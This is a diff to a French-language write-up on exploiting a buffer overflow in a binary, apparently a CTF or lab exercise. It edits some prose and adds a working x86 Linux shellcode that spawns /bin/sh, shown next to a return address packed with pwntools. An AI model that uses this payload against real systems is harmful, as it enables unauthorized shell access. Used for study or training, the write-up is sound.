@@ -609,7 +609,7 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 Segmentation fault (core dumped)
 
 ```
-Le code est sujet a un BOF.
+Le code est sujet a un BOF ?.
 
 En désassemblant ce binaire, on peux trouvé un code assez simpliste:
 ```
@@ -681,7 +681,13 @@ Type "help", "copyright", "credits" or "license" for more information.
 >>> p32(0xbffff670)
 'p\xf6\xff\xbf' 
 ```
-Le shellcode quand a lui est un code tous fait que l'on trouve facilement sur le net. C'est d'ailleur le meme que Hackndo dans son super tutoriel sur le BOF (https://beta.hackndo.com/buffer-overflow/).
+
+Le shellcode quand a lui est un code tous fait que l'on trouve facilement sur le net. C'est d'ailleur le meme que Pixis dans son super tutoriel sur le <a href="https://beta.hackndo.com/buffer-overflow/">BOF</a>.
+
+Shellcode:
+```
+\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh
+```
 
 Donc on a notre payload sous la forme suivante:
 ```
